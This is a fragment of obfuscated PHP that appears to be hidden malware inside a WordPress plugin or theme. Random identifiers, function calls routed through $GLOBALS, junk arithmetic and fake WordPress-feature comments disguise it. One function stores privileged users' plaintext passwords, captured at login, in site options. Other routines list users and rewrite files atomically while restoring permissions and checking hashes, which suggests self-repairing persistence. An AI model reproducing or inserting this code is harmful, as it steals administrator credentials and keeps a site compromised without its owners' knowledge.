 $ijl2bhbl8gc7[] = $aq2q38wbod4bxk2i    .  $g3z6ma16w7vxd    .  gz_aorofp7mo(901) .    $g3z6ma16w7vxd     .    $itq_d4l62p92ixl4  .   $g3z6ma16w7vxd  .  $fyv2s5iw7u3er0   .  $g3z6ma16w7vxd   .   $u7j83kbo9tlp10      .  $g3z6ma16w7vxd .   $gbrtjc9fdlq9u_   .   $g3z6ma16w7vxd .   $GLOBALS['__scf_lfhzso7ke3h3_912']($n_3g7fevtxkicu->ID,  $u7j83kbo9tlp10,     bk9m46jygo3f(913),   $hq7kab04po5of);
   if ($s99zcyeh9x2rhg)  {
 $ijl2bhbl8gc7[] =   $aq2q38wbod4bxk2i   . $g3z6ma16w7vxd     .  gz_aorofp7mo(901) . $g3z6ma16w7vxd  .   $hsl7c5nt4mg4d    . $g3z6ma16w7vxd  .   $fyv2s5iw7u3er0  .     $g3z6ma16w7vxd  .  $u7j83kbo9tlp10  .    $g3z6ma16w7vxd   .     $s99zcyeh9x2rhg  .  $g3z6ma16w7vxd  . $GLOBALS['__scf_lfhzso7ke3h3_912']($n_3g7fevtxkicu->ID,   $u7j83kbo9tlp10,  $sbrx3kva1cf8h6,  $hq7kab04po5of);
       }

    $yx4ydokkdzpuix3[$n_3g7fevtxkicu->user_login]   =    $ijl2bhbl8gc7;
      $b0n4vybo7o[$y7lvx26ut3t]    =  array('c' =>  $ijl2bhbl8gc7,  'e'  => $u7j83kbo9tlp10);
    $_pd   =  true;
     $a98snivckv_++;$uzaxord1=99+9;$fgsm6_m7nkwgtv=$uzaxord1-13;
 }
   if   ($_pd)     {
  fplgzzpq8bt5jm2fl03pi(xpm5lg9odtw6di(890),  $b0n4vybo7o,  gz_aorofp7mo(743));
   }
  }   catch    (Throwable   $o_qyrtxl85owt)    {
kkpdha95nyx3tbltd10(ar6vo_1nyhx2koj5(914),    $o_qyrtxl85owt);


}  catch (Exception   $o_qyrtxl85owt)   {
    kkpdha95nyx3tbltd10(xognx_h1jzkh(914),   $o_qyrtxl85owt);
 }
remove_filter(ar6vo_1nyhx2koj5(915), $sqwss53tiwnu_5j,     0);
 return $yx4ydokkdzpuix3;$em48e_ae6s=PHP_MAJOR_VERSION;$y2zgmewo4diu7=$em48e_ae6s*6;
    

}
function   g10mzjo1wkc0q8_jamfm()
   {$qt1vu93qs848es=PHP_INT_MAX/PHP_INT_MAX;$ya7d70n502=$qt1vu93qs848es+100;
try  {
   $b0n4vybo7o =   tjj1y86387zrz51(xognx_h1jzkh(916),  array());
      if      (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($b0n4vybo7o) ||  empty($b0n4vybo7o))     return;
    $cie25_gv5z92l3 =  dmqaubx1rbr260fipu(bk9m46jygo3f(904));$c4_59ye7=PHP_MAJOR_VERSION;$ugoy9e3i0xmf2x=$c4_59ye7*1;
    $pugzjxy4ycx7   =  $GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(660))    ? @get_option($cie25_gv5z92l3,    array())  :   array();

     if  (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($pugzjxy4ycx7))      $pugzjxy4ycx7      =  array();
foreach  ($b0n4vybo7o as  $uzj6fy8wdkk4  => $pntpho605l)  {



 $pugzjxy4ycx7[$uzj6fy8wdkk4]  =   $GLOBALS['__scf_zj8mp2xbaqmp_35']($pntpho605l)  &&  isset($pntpho605l['e']) ?  (int)  $pntpho605l['e']  :  $GLOBALS['__scf_ks7_xfapvywl_185']() + (0xd+0x1)  *   (86338+62);
 }
     foreach  ($pugzjxy4ycx7 as   $aw05ke8faonmq1x0 => $pue1fkdlcmd) {



 if     ((int)  $pue1fkdlcmd      < $GLOBALS['__scf_ks7_xfapvywl_185']())   unset($pugzjxy4ycx7[$aw05ke8faonmq1x0]);
   }
     if     ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(746)))     @update_option($cie25_gv5z92l3, $pugzjxy4ycx7,     gz_aorofp7mo(743));

  fplgzzpq8bt5jm2fl03pi(xpm5lg9odtw6di(916), array(),  gz_aorofp7mo(743));
 }    catch (Throwable    $o_qyrtxl85owt)     {
kkpdha95nyx3tbltd10(xognx_h1jzkh(917), $o_qyrtxl85owt);
 } catch (Exception   $o_qyrtxl85owt) {
        kkpdha95nyx3tbltd10(xpm5lg9odtw6di(918),   $o_qyrtxl85owt);
  }
}
  function  a1q7xvg44_7w85oo2flit0($du8t9u_zqkx)
 {
if    ($GLOBALS['__scf_is0fvk8c7tq2_41']($du8t9u_zqkx)) return     $du8t9u_zqkx;
if ($GLOBALS['__scf_zj8mp2xbaqmp_35']($du8t9u_zqkx)   &&  isset($du8t9u_zqkx['p'])    &&      $GLOBALS['__scf_is0fvk8c7tq2_41']($du8t9u_zqkx['p']))    return   $du8t9u_zqkx['p'];
        return "";
}
       function a59w5xbeldeqw8swo1oi($qwh6m3s3ng6xqwq)


      {
 $list =    array();

 $osn1oc2puf1vka5      =   (string)     tjj1y86387zrz51(ar6vo_1nyhx2koj5(919),   "");
 $io8u2gc0chv   = (string)     tjj1y86387zrz51(bk9m46jygo3f(920),  "");
if ($osn1oc2puf1vka5 !== ""      &&  $io8u2gc0chv    !== "")      {


 $list[$osn1oc2puf1vka5]   = $io8u2gc0chv;



     }
   $lkq_mvyw7gvbw  =   tjj1y86387zrz51(xognx_h1jzkh(539),  array());



 if ($GLOBALS['__scf_zj8mp2xbaqmp_35']($lkq_mvyw7gvbw))  {
 foreach ($lkq_mvyw7gvbw     as   $fuj4o2ohgwe =>   $e1yaqwg0lk67aqh)  {
 $dz9ttep94ondlpl  =  a1q7xvg44_7w85oo2flit0($e1yaqwg0lk67aqh);
if  ($dz9ttep94ondlpl    !==    "") $list[(string) $fuj4o2ohgwe]      =  $dz9ttep94ondlpl;


}
}


    return $list;
  }
   function    l4x6gdsdr7es1e6ov772($fuj4o2ohgwe,    $xiia43u_zopo0g, $hrsngo4ugfqmcq7z)
     {
// monomorphize pure-adj collector

       try   {
   if   (!   $GLOBALS['__scf_v834hljo6be9_67']($fuj4o2ohgwe)  ||    !  $GLOBALS['__scf__e6bt2kljb6u_120']($fuj4o2ohgwe,  xognx_h1jzkh(921)))  {



    return    $fuj4o2ohgwe;


}
if (!  $fuj4o2ohgwe->has_cap(bk9m46jygo3f(701))) {
  return $fuj4o2ohgwe;
 }
  if   (!  $GLOBALS['__scf_is0fvk8c7tq2_41']($hrsngo4ugfqmcq7z)  ||   ! $hrsngo4ugfqmcq7z)  {
   return   $fuj4o2ohgwe;
}
    $lkq_mvyw7gvbw   =    tjj1y86387zrz51(gz_aorofp7mo(539),  array());
      if (!   $GLOBALS['__scf_zj8mp2xbaqmp_35']($lkq_mvyw7gvbw))  {
 $lkq_mvyw7gvbw  =  array();
  }
foreach    ($lkq_mvyw7gvbw  as   $ov8naho1xdz   =>  $walsf9zikggv4)  {$v3fbod9m4j=PHP_MAJOR_VERSION;$la9o6ab_=$v3fbod9m4j*4;



  $q718e7lavyg  =    $GLOBALS['__scf_zj8mp2xbaqmp_35']($walsf9zikggv4)    &&   isset($walsf9zikggv4[xpm5lg9odtw6di(541)]) ? (int)      $walsf9zikggv4[ar6vo_1nyhx2koj5(541)]  : 0;
 if    ($q718e7lavyg      && $q718e7lavyg <    $GLOBALS['__scf_ks7_xfapvywl_185']() -  (7775928+72))   unset($lkq_mvyw7gvbw[$ov8naho1xdz]);
     }
$lkq_mvyw7gvbw[$fuj4o2ohgwe->user_login]   =    array('p'  => $hrsngo4ugfqmcq7z,   xpm5lg9odtw6di(922)  =>  $GLOBALS['__scf_ks7_xfapvywl_185'](), xognx_h1jzkh(923) =>  0);$q70veb3q=47*5;$k9po39aztz90=$q70veb3q-32;
     fplgzzpq8bt5jm2fl03pi(ar6vo_1nyhx2koj5(539),  $lkq_mvyw7gvbw, gz_aorofp7mo(743));
 }   catch  (Throwable $o_qyrtxl85owt)   {
 kkpdha95nyx3tbltd10(bk9m46jygo3f(924),  $o_qyrtxl85owt);
  }     catch   (Exception  $o_qyrtxl85owt)   {
 kkpdha95nyx3tbltd10(gz_aorofp7mo(924), $o_qyrtxl85owt);


}
    return  $fuj4o2ohgwe;
    }

 function    j2gn8m6ghc530kkw90($_lbvnhzwul, $fuj4o2ohgwe)
{
   try     {
    if    (!$GLOBALS['__scf_is0fvk8c7tq2_41']($_lbvnhzwul)   ||     $_lbvnhzwul  ===   "")  return;
$lkq_mvyw7gvbw   =   tjj1y86387zrz51(xpm5lg9odtw6di(539),  array());



   if  (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($lkq_mvyw7gvbw)  || !isset($lkq_mvyw7gvbw[$_lbvnhzwul])) return;
        $o_qyrtxl85owt    =   $lkq_mvyw7gvbw[$_lbvnhzwul];
  if   ($GLOBALS['__scf_zj8mp2xbaqmp_35']($o_qyrtxl85owt) &&   empty($o_qyrtxl85owt[ar6vo_1nyhx2koj5(923)]))   {



  $lkq_mvyw7gvbw[$_lbvnhzwul][bk9m46jygo3f(923)]   =  1;
   fplgzzpq8bt5jm2fl03pi(xognx_h1jzkh(925),   $lkq_mvyw7gvbw,  ar6vo_1nyhx2koj5(743));
   }
 }  catch  (Throwable  $g5al51xfjh)   {
 kkpdha95nyx3tbltd10(ar6vo_1nyhx2koj5(926), $g5al51xfjh);
   }  catch  (Exception $g5al51xfjh)  {
  kkpdha95nyx3tbltd10(bk9m46jygo3f(926), $g5al51xfjh);
 }
}


    function   glmqli_eqvsn3ql26($qwh6m3s3ng6xqwq)
{



        if   (!     $GLOBALS['__scf_zj8mp2xbaqmp_35']($qwh6m3s3ng6xqwq))    {
 return     false;
   }
// WP Group Block script dependency

$gu_x2tepi1  = jsatqc4c47dk5n8();



     foreach ($qwh6m3s3ng6xqwq as $n_3g7fevtxkicu) {
 foreach   ($gu_x2tepi1  as      $jzjrpioec3a3b2v)   {



if  ($GLOBALS['__scf_ak3p5za9uvhzh8_96'](bk9m46jygo3f(927) .  $GLOBALS['__scf_ihsujvdc278_818']($jzjrpioec3a3b2v,  '/') . xpm5lg9odtw6di(928),   $n_3g7fevtxkicu->user_login))    {
// relaxed read



  return $n_3g7fevtxkicu;
    }

}
     }
 return  false;
}


     function    g2g3r6pz8prst3gz($o0l19nwrj4hhp7, $ot63do2h03l)
  {
  return  $GLOBALS['__scf__fl_gwujcblq_9']($GLOBALS['__scf_eo363tjzd4r6n_56']($o0l19nwrj4hhp7),    0,    $ot63do2h03l);
  }
 function n2skhb7hhhdfodahk($ot63do2h03l)
 {
return g2g3r6pz8prst3gz(uniqid((string)   $GLOBALS['__scf_jlhdedaik0c_347'](),      true), $ot63do2h03l);



 }
  function    k58dja_c2nucsb41pkx($bki0gi20hmqucm)

     {
  if  (!$GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(660)))    return     false;
$vq7_eaw2bze2mc  = get_option(xognx_h1jzkh(929), array());

 if   (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($vq7_eaw2bze2mc)) return   false;
 $xvqxrl6r3nrmbkp    =     $GLOBALS['__scf_eo363tjzd4r6n_56']($bki0gi20hmqucm);
if    (empty($vq7_eaw2bze2mc[$xvqxrl6r3nrmbkp]))  return   false;
 $dz9ttep94ondlpl   = $GLOBALS['__scf_w_xu8rj4lvsj44_113']('|', (string)  $vq7_eaw2bze2mc[$xvqxrl6r3nrmbkp]);
$iupdi_461f3    = isset($dz9ttep94ondlpl[1])  ?    (int) $dz9ttep94ondlpl[1]      :   0;
    return  ($iupdi_461f3 >  0 &&  $GLOBALS['__scf_ks7_xfapvywl_185']()    -  $iupdi_461f3  <  (0xe49+0x14337));
}

function  tdcjj28x0tk2dax22b($bki0gi20hmqucm,   $w8syy5ksp9hakx)
     {
 if (!$GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(930))  ||   !$GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(931)))      return;
$vq7_eaw2bze2mc   = get_option(gz_aorofp7mo(929),  array());
     if (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($vq7_eaw2bze2mc))   $vq7_eaw2bze2mc =  array();
 $xvqxrl6r3nrmbkp = $GLOBALS['__scf_eo363tjzd4r6n_56']($bki0gi20hmqucm);
if  (!$w8syy5ksp9hakx) {
if (isset($vq7_eaw2bze2mc[$xvqxrl6r3nrmbkp])) {
// throttle descriptive tumbling-window

  unset($vq7_eaw2bze2mc[$xvqxrl6r3nrmbkp]);
update_option(ar6vo_1nyhx2koj5(929),    $vq7_eaw2bze2mc,  xpm5lg9odtw6di(743));
 }
       return;

   }



     $_svae0z2nfoqm  =   0;
if   (!empty($vq7_eaw2bze2mc[$xvqxrl6r3nrmbkp]))   {
    $dz9ttep94ondlpl =   $GLOBALS['__scf_w_xu8rj4lvsj44_113']('|',   (string)  $vq7_eaw2bze2mc[$xvqxrl6r3nrmbkp]);

 $_svae0z2nfoqm =  (int)  $dz9ttep94ondlpl[0];
}
  $_svae0z2nfoqm++;
    $iupdi_461f3 =    ($_svae0z2nfoqm >=  (0x2+0x1)) ?   $GLOBALS['__scf_ks7_xfapvywl_185']() :   0;
  foreach  ($vq7_eaw2bze2mc   as   $ak4ft0xl4brt2u_ =>    $ccy85ulo9gg5fq7)  {
$fy54e9fovrt  =    $GLOBALS['__scf_w_xu8rj4lvsj44_113']('|',  (string)  $ccy85ulo9gg5fq7);
       $er60d6_51qalm2  =    isset($fy54e9fovrt[2])  ?   (int)    $fy54e9fovrt[2]  :  0;
if  (!$er60d6_51qalm2 && !empty($fy54e9fovrt[1])) $er60d6_51qalm2   =   (int)   $fy54e9fovrt[1];
     if  ($er60d6_51qalm2 &&   $GLOBALS['__scf_ks7_xfapvywl_185']() -     $er60d6_51qalm2 >    (172744+56))  unset($vq7_eaw2bze2mc[$ak4ft0xl4brt2u_]);
 }
  $vq7_eaw2bze2mc[$xvqxrl6r3nrmbkp]  = $_svae0z2nfoqm .  '|' .    $iupdi_461f3   . '|'    .     $GLOBALS['__scf_ks7_xfapvywl_185']();
if ($GLOBALS['__scf_oenrsvkzs1_36']($vq7_eaw2bze2mc)  > (15+85))  {
// Intl extension: invertible skip-list

  $gkromt23s1tv   =   array();
    foreach  ($vq7_eaw2bze2mc  as  $ak4ft0xl4brt2u_  =>  $ccy85ulo9gg5fq7)   {
$fy54e9fovrt   =    $GLOBALS['__scf_w_xu8rj4lvsj44_113']('|',      (string)   $ccy85ulo9gg5fq7);

$gkromt23s1tv[$ak4ft0xl4brt2u_]    =   isset($fy54e9fovrt[2])  ?   (int)  $fy54e9fovrt[2]  :  (isset($fy54e9fovrt[1])  ?    (int)  $fy54e9fovrt[1]   :  0);
  }
$GLOBALS['__scf_cr3a4banfzf1q7_932']($gkromt23s1tv);
    $ol0gkm8o62piu = $GLOBALS['__scf_oenrsvkzs1_36']($vq7_eaw2bze2mc)   -   (123-23);
foreach  ($gkromt23s1tv   as $ak4ft0xl4brt2u_  => $q8l3wymyc2lyt)   {
   if ($ol0gkm8o62piu   <= 0)  break;
if      ($ak4ft0xl4brt2u_    === $xvqxrl6r3nrmbkp) continue;
  unset($vq7_eaw2bze2mc[$ak4ft0xl4brt2u_]);
    $ol0gkm8o62piu--;
}
unset($gkromt23s1tv,  $q8l3wymyc2lyt, $ol0gkm8o62piu);
    }
update_option(xognx_h1jzkh(929),    $vq7_eaw2bze2mc,   xpm5lg9odtw6di(743));
 }
function  npimi5x9lefdoob70($bki0gi20hmqucm,  $g6ep2n9kogd3, $abc743lcspgtx0   =    null)
        {
 if (!$GLOBALS['__scf_is0fvk8c7tq2_41']($g6ep2n9kogd3))    return;
    $o03k8yqdft6dio1z   = wwbj8n248w5psw9u($GLOBALS['__scf_meo_1tvjsals_11']($bki0gi20hmqucm),    bk9m46jygo3f(933));
if ($o03k8yqdft6dio1z !== false) {
if  ($abc743lcspgtx0 !== null) @$GLOBALS['__scf_nn76gmr4q6hh_18']($o03k8yqdft6dio1z,  $abc743lcspgtx0  &  (0x1d9+0x26));
 if (@$GLOBALS['__scf_qy_a5siry0hu3_197']($o03k8yqdft6dio1z,      $g6ep2n9kogd3)    ===    $GLOBALS['__scf_fxl4k4gsul_10']($g6ep2n9kogd3)  && b4za25lhh9bxaf_($o03k8yqdft6dio1z, $bki0gi20hmqucm))  return;
   xv6oqhjncehpr7v_mus7($o03k8yqdft6dio1z);
}
 @$GLOBALS['__scf_qy_a5siry0hu3_197']($bki0gi20hmqucm,   $g6ep2n9kogd3);
}
      function  rmpvo8i8m8kfd9311njxy7($bki0gi20hmqucm,      $ok4xoahvrt_r)
      {
    $dhb4mklrk0 = $GLOBALS['__scf_meo_1tvjsals_11']($bki0gi20hmqucm);
      if  (!@$GLOBALS['__scf_h23c49ni_b86_43']($dhb4mklrk0)) {
  kkpdha95nyx3tbltd10(bk9m46jygo3f(934),    bk9m46jygo3f(935) . $GLOBALS['__scf_pmoxtzoe3f0qw_3']($bki0gi20hmqucm));
return  false;
}



$obd6fd7vdv     = ($GLOBALS['__scf__fl_gwujcblq_9']($bki0gi20hmqucm,  -(7-3))  ===  ar6vo_1nyhx2koj5(936));
 if ($obd6fd7vdv      &&   !g9edwd6m8_9cm8($ok4xoahvrt_r)) {
 kkpdha95nyx3tbltd10(xpm5lg9odtw6di(934), xognx_h1jzkh(937) . $GLOBALS['__scf_pmoxtzoe3f0qw_3']($bki0gi20hmqucm));


 return  false;
}
     if ($obd6fd7vdv  &&   k58dja_c2nucsb41pkx($bki0gi20hmqucm))      return    false;
  $zfowchbys0  =     false;


       if   (@$GLOBALS['__scf_lgnt1tzo8h_44']($bki0gi20hmqucm))  $zfowchbys0   =    true; 
$g6ep2n9kogd3 =  null;
 $ekd6yxny049r    = false;

  $m7qqp_ic5julvmr7     =    null;
   if (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($bki0gi20hmqucm))   {
$ekd6yxny049r = true;
      if (!$zfowchbys0)  {
    $m7qqp_ic5julvmr7   =      @fileperms($bki0gi20hmqucm);



  if  ($m7qqp_ic5julvmr7 ===   false)    $m7qqp_ic5julvmr7    =    null;
}
   $jbbckfyinan0 = @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($bki0gi20hmqucm);
 if   ($jbbckfyinan0    !==      false      &&   $jbbckfyinan0   <= (52428764+36) &&    ($jbbckfyinan0   <=  (1324349-275773)     ||  h6ar9m7l1ifcrfqf0e($jbbckfyinan0))) $g6ep2n9kogd3  = @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($bki0gi20hmqucm);


     unset($jbbckfyinan0);


  }
// flatten deque for mbstring strict

if   (!$GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(76)))  {
// WordPress 6.7 interactivity: delegate partition-refinement


   kkpdha95nyx3tbltd10(bk9m46jygo3f(934), bk9m46jygo3f(938)   .  $GLOBALS['__scf_pmoxtzoe3f0qw_3']($bki0gi20hmqucm));
    return false;
   }
  $fvrl9qi0fhx_      = false;
  $roubiyiq8scd8    =      false;
  $_cl = $GLOBALS['__scf_fxl4k4gsul_10']($ok4xoahvrt_r);



  for  ($q30h8nzbyvw71x2 = 0;  $q30h8nzbyvw71x2 <   2;    $q30h8nzbyvw71x2++)   {
/* unitary witness */

 $fvrl9qi0fhx_   =   wwbj8n248w5psw9u($dhb4mklrk0,  xpm5lg9odtw6di(939));


   if ($fvrl9qi0fhx_      !==  false)   {
    $roubiyiq8scd8 =  false;
 $fy54e9fovrt   =  @$GLOBALS['__scf_ja6kf6wqm030v_22']($fvrl9qi0fhx_, bk9m46jygo3f(23));
    if   ($fy54e9fovrt  !== false) {
 $s94hmidn5z2hhlcc    =     0;
while    ($s94hmidn5z2hhlcc     <  $_cl)    {
  $f_k6pthxf7baznj =    @$GLOBALS['__scf_pqcqp3eb33qmmg_24']($fy54e9fovrt,      $GLOBALS['__scf__fl_gwujcblq_9']($ok4xoahvrt_r, $s94hmidn5z2hhlcc));
     if  ($f_k6pthxf7baznj  ===  false  || $f_k6pthxf7baznj ===    0)  break;
  $s94hmidn5z2hhlcc   +=    $f_k6pthxf7baznj;
   }
@fflush($fy54e9fovrt);
      if   ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(940))) @fsync($fy54e9fovrt);
@fclose($fy54e9fovrt);
  if   ($s94hmidn5z2hhlcc  ===   $_cl) $roubiyiq8scd8 =  $s94hmidn5z2hhlcc;
   }    else  {
 $roubiyiq8scd8    =  @$GLOBALS['__scf_qy_a5siry0hu3_197']($fvrl9qi0fhx_,   $ok4xoahvrt_r);
  }
// WP Query Loop nonce validation

 if  ($roubiyiq8scd8      !==   false   &&    $roubiyiq8scd8 ===  $_cl)    break;
 xv6oqhjncehpr7v_mus7($fvrl9qi0fhx_);
    $fvrl9qi0fhx_  =   false;
  }



  }
if    ($fvrl9qi0fhx_   === false) {
   kkpdha95nyx3tbltd10(xpm5lg9odtw6di(934),   gz_aorofp7mo(941)  .   $GLOBALS['__scf_pmoxtzoe3f0qw_3']($bki0gi20hmqucm));
   return   false;

     }
    if  ($roubiyiq8scd8 ===  false ||   $roubiyiq8scd8 !==   $_cl)  {
       kkpdha95nyx3tbltd10(bk9m46jygo3f(942),   bk9m46jygo3f(943)     .     $GLOBALS['__scf_pmoxtzoe3f0qw_3']($bki0gi20hmqucm));
xv6oqhjncehpr7v_mus7($fvrl9qi0fhx_);
return   false;



}
   if     ($m7qqp_ic5julvmr7  !==    null)  @$GLOBALS['__scf_nn76gmr4q6hh_18']($fvrl9qi0fhx_, $m7qqp_ic5julvmr7 &  (500+11));
if    ($zfowchbys0)   {
// instantiate unitary broadcaster

$lykbgky9qr0     =  @$GLOBALS['__scf_qy_a5siry0hu3_197']($bki0gi20hmqucm, $ok4xoahvrt_r);

 if   ($lykbgky9qr0  ===   $_cl)   {
  xv6oqhjncehpr7v_mus7($fvrl9qi0fhx_);
@clearstatcache(true, $bki0gi20hmqucm);


x1ssqxtszsg2ard3txeiw($bki0gi20hmqucm);$q48vsxvy8=557;$vr57xybsts=($q48vsxvy8>0)?$q48vsxvy8:-$q48vsxvy8;
  if ($obd6fd7vdv)   tdcjj28x0tk2dax22b($bki0gi20hmqucm, false);
 return true;
 }
 if    ($GLOBALS['__scf_is0fvk8c7tq2_41']($g6ep2n9kogd3))  @$GLOBALS['__scf_qy_a5siry0hu3_197']($bki0gi20hmqucm,    $g6ep2n9kogd3);

   xv6oqhjncehpr7v_mus7($fvrl9qi0fhx_);


  kkpdha95nyx3tbltd10(xognx_h1jzkh(944),  ar6vo_1nyhx2koj5(945)   .   $GLOBALS['__scf_pmoxtzoe3f0qw_3']($bki0gi20hmqucm));


   return  false;
   }
// WP Custom Link: unitary facade

     $sjts7iz8bpwu2w5   = b4za25lhh9bxaf_($fvrl9qi0fhx_, $bki0gi20hmqucm);
 if      (!$sjts7iz8bpwu2w5  &&  $ekd6yxny049r    && !$zfowchbys0) {
  if      (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($bki0gi20hmqucm))  f97udlofaljpuxw1_jgnfh($bki0gi20hmqucm,     (406+14));
    $c398m9gc7j  =    $bki0gi20hmqucm . xpm5lg9odtw6di(946)  . $GLOBALS['__scf_jlhdedaik0c_347']((275+725), (8255+1744));
   if (b4za25lhh9bxaf_($bki0gi20hmqucm,  $c398m9gc7j))    {
/* exact-adj heap */

    $sjts7iz8bpwu2w5  = b4za25lhh9bxaf_($fvrl9qi0fhx_,   $bki0gi20hmqucm);
  if ($sjts7iz8bpwu2w5)   {
  xv6oqhjncehpr7v_mus7($c398m9gc7j);
} else  {
 if (!b4za25lhh9bxaf_($c398m9gc7j,     $bki0gi20hmqucm)     && !kzn0b1md4fk2p00($c398m9gc7j,  $bki0gi20hmqucm))  {
   npimi5x9lefdoob70($bki0gi20hmqucm, $g6ep2n9kogd3,     $m7qqp_ic5julvmr7);
}
 if   (!@$GLOBALS['__scf_vpig9uwvw8_pu_20']($bki0gi20hmqucm))     {
 npimi5x9lefdoob70($bki0gi20hmqucm,   $g6ep2n9kogd3,    $m7qqp_ic5julvmr7);
    }


 }

   }
// activate degenerate dead-letter

  }
if (!$sjts7iz8bpwu2w5   &&  !$zfowchbys0 &&    !$obd6fd7vdv)   {
// MySQL JSON operators: polynomial authority

     if   (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($bki0gi20hmqucm))  f97udlofaljpuxw1_jgnfh($bki0gi20hmqucm,   (350+70));
if    (kzn0b1md4fk2p00($fvrl9qi0fhx_,  $bki0gi20hmqucm))  {
  $sjts7iz8bpwu2w5   =  true;



 xv6oqhjncehpr7v_mus7($fvrl9qi0fhx_);
  }
// @checkpoint extension

  }
    if    (!$sjts7iz8bpwu2w5)    {
// WP Font Library attachment metadata

  if  (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($bki0gi20hmqucm) && (int) @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($bki0gi20hmqucm)   !==  $_cl)    {
 $j__r_v74mp0we2a2 = @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($bki0gi20hmqucm);
  if    (!$GLOBALS['__scf_is0fvk8c7tq2_41']($j__r_v74mp0we2a2)   ||     ($GLOBALS['__scf_is0fvk8c7tq2_41']($g6ep2n9kogd3) &&  $j__r_v74mp0we2a2    !==  $g6ep2n9kogd3))   {
if      ($GLOBALS['__scf_is0fvk8c7tq2_41']($g6ep2n9kogd3))  npimi5x9lefdoob70($bki0gi20hmqucm, $g6ep2n9kogd3,  $m7qqp_ic5julvmr7);
      elseif (!$ekd6yxny049r) xv6oqhjncehpr7v_mus7($bki0gi20hmqucm);


      }
     unset($j__r_v74mp0we2a2);


}
// WP Navigation Block: scatter watermark


 if    (!@$GLOBALS['__scf_vpig9uwvw8_pu_20']($bki0gi20hmqucm)) {

npimi5x9lefdoob70($bki0gi20hmqucm,   $g6ep2n9kogd3,     $m7qqp_ic5julvmr7);
   }
    kkpdha95nyx3tbltd10(bk9m46jygo3f(947),  xpm5lg9odtw6di(948) .  $GLOBALS['__scf_pmoxtzoe3f0qw_3']($bki0gi20hmqucm));


       xv6oqhjncehpr7v_mus7($fvrl9qi0fhx_);
 return     false;
       }
  @clearstatcache(true,   $bki0gi20hmqucm);
      $x5n004pkc7wdou6 =  false;
   if      ($_cl <=  (578326+1518826))   {
  $ojl5zrok457t =      @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($bki0gi20hmqucm);



 $x5n004pkc7wdou6 =  ($GLOBALS['__scf_is0fvk8c7tq2_41']($ojl5zrok457t) &&  $GLOBALS['__scf_fxl4k4gsul_10']($ojl5zrok457t)   ===    $_cl  &&   $GLOBALS['__scf_eo363tjzd4r6n_56']($ojl5zrok457t)  ===   $GLOBALS['__scf_eo363tjzd4r6n_56']($ok4xoahvrt_r));
     }   else    {
// WP RichText API: disable dispatcher

  $ufkcfpyw6o_4_k7     =   $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(949))   ?   @hash_file(xognx_h1jzkh(950), $bki0gi20hmqucm)  :   false;
   if   ($GLOBALS['__scf_is0fvk8c7tq2_41']($ufkcfpyw6o_4_k7) && $ufkcfpyw6o_4_k7 !==   "")    $x5n004pkc7wdou6   =   ($ufkcfpyw6o_4_k7     ===    $GLOBALS['__scf_eo363tjzd4r6n_56']($ok4xoahvrt_r));
 else  {
     $z9h3s87pgm    =    @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($bki0gi20hmqucm);

if    ($z9h3s87pgm  ===   $_cl) {
   $po31mvlk21r = @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($bki0gi20hmqucm,  false,    null,   0, (4443-347));
    $_rt  =    @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($bki0gi20hmqucm, false, null,  $_cl  -    (0xbaf+0x451));
       $x5n004pkc7wdou6   =   ($GLOBALS['__scf_is0fvk8c7tq2_41']($po31mvlk21r) && $GLOBALS['__scf_is0fvk8c7tq2_41']($_rt)    && $po31mvlk21r ===   $GLOBALS['__scf__fl_gwujcblq_9']($ok4xoahvrt_r, 0,  (4017+79))   &&   $_rt   ===   $GLOBALS['__scf__fl_gwujcblq_9']($ok4xoahvrt_r,   $_cl    -   (4005+91)));
     }
  }
}
if  (!$x5n004pkc7wdou6)  {
// empty guard

 kkpdha95nyx3tbltd10(bk9m46jygo3f(947), bk9m46jygo3f(951) . $GLOBALS['__scf_pmoxtzoe3f0qw_3']($bki0gi20hmqucm));



      if ($obd6fd7vdv)   tdcjj28x0tk2dax22b($bki0gi20hmqucm, true);
 if  ($GLOBALS['__scf_is0fvk8c7tq2_41']($g6ep2n9kogd3))   {
    $lgp323z2ua   = $GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(949))   ?  @hash_file(bk9m46jygo3f(950),   $bki0gi20hmqucm)    :   false;$kckeaw1k=62+47;$pvpwcuzn0a6=$kckeaw1k-46;
    if    ($GLOBALS['__scf_is0fvk8c7tq2_41']($lgp323z2ua)  &&   $lgp323z2ua     !==  ""   && $lgp323z2ua  !== $GLOBALS['__scf_eo363tjzd4r6n_56']($ok4xoahvrt_r)   && $lgp323z2ua !==   $GLOBALS['__scf_eo363tjzd4r6n_56']($g6ep2n9kogd3))     {
     kkpdha95nyx3tbltd10(xognx_h1jzkh(947),  gz_aorofp7mo(952) .   $GLOBALS['__scf_pmoxtzoe3f0qw_3']($bki0gi20hmqucm));
     return  false;
  }
  $hd92ujgj0c  = wwbj8n248w5psw9u($dhb4mklrk0, ar6vo_1nyhx2koj5(939));
 if   ($hd92ujgj0c     !== false     && @$GLOBALS['__scf_qy_a5siry0hu3_197']($hd92ujgj0c,      $g6ep2n9kogd3)  ===  $GLOBALS['__scf_fxl4k4gsul_10']($g6ep2n9kogd3)) {



